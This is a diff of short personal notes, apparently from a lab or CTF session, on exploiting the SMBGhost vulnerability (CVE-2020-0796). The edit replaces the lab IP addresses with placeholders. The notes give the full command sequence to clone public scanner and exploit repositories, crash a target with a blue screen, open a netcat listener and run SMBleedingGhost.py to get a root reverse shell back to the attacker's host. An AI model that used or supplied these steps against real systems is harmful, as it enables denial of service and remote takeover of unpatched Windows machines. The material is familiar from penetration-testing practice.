@@ -6,15 +6,15 @@ Lets do SMBGhost Vulnerability
 
     check if vulnerable:
         git clone https://github.com/ButrintKomoni/cve-2020-0796
-        python3 cve-2020-0796-scanner.py 192.168.59.16
+        python3 cve-2020-0796-scanner.py <VICTIM IP>
 
             ┌──(kali㉿kali)-[/opt/cve-2020-0796]
-            └─$ python3 cve-2020-0796-scanner.py 192.168.59.16
+            └─$ python3 cve-2020-0796-scanner.py <VICTIM IP>
             Vulnerable
 
     lets blue screen it:
         git clone https://github.com/jiansiting/CVE-2020-0796.git
-        python3 cve-2020-0796.py 192.168.59.16
+        python3 cve-2020-0796.py <VICTIM IP>
         -> BLUE SCREEN of death!!!
 
     lets exploit it:
@@ -22,7 +22,7 @@ Lets do SMBGhost Vulnerability
         nc -lvp 4444
 
         run from other windows machine: 
-            python3 SMBleedingGhost.py 192.168.59.16 192.168.59.13 4444    
+            python3 SMBleedingGhost.py <VICTIM IP> <HACKER IP> 4444    
                 works! got ROOT shell on port 4444
 
     
